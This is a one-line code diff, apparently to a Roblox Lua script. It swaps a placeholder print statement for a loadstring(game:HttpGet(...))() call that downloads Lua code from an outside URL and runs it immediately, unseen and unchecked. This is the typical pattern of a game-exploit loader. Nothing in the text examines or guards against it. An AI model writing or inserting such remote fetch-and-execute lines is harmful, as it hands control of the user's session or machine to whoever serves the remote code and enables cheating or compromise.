@@ -1,1 +1,1 @@
-print("loader all scirpt")
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/9bfa926772e8b1e2f31f67cd4dc4e7ab.lua"))()
